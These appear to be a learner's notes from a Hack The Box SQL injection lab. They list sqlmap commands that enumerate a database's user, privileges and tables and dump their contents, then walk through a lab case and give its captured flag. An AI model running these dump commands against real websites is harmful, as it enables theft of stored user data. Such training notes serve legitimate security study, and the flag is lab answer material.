
### Basic Database Enumeration

Enumeration usually starts with the retrieval of the basic information:

- Database version banner (switch `--banner`)
- Current user name (switch `--current-user`)
- Current database name (switch `--current-db`)
- Checking if the current user has DBA (administrator) rights (switch `--is-dba`)

This command can do all the above:
```go
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```


### Table Enumeration
```go
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
```

Dumping table contents, after ID'ing table name:
```go
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
```


### Table and Row Enumeration

```go
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
```

Search rows based on their record numbers:
```go
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
```

### Conditional Enumeration

Search on rows based on a WHERE condition:
```go
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```

### Full DB Enumeration

To simultaneously enumerate all tables omit the `-T` and `--dump -D testdb` options:

```go
sqlmap -u "http://www.example.com/?id=1" --dump-all --exclude-sysdbs
```

# Questions

### What's the contents of table flag1 in the testdb database? (Case #1)

Find the name of the user and database. Is the user a DBA?
```go
sqlmap -u "http://154.57.164.69:32459/case1.php?id=1" --banner --current-user --current-db --is-dba
```

![[Pasted image 20260715154314.png]]

user:
```go
user1@localhost
```

database name:
```go
testdb
```

Enumerate the table:
```go
sqlmap -u "http://154.57.164.69:32459/case1.php?id=1" --tables -D testdb
```

found two tables: flag1 and users
![[Pasted image 20260715155101.png]]

Now that we've found two tables, I'll dump the contents of flag1:
```go
sqlmap -u "http://154.57.164.69:32459/case1.php?id=1" --dump -T flag1 -D testdb
```

Answer:
```go
HTB{c0n6r475_y0u_kn0w_h0w_70_run_b451c_5qlm4p_5c4n}
```

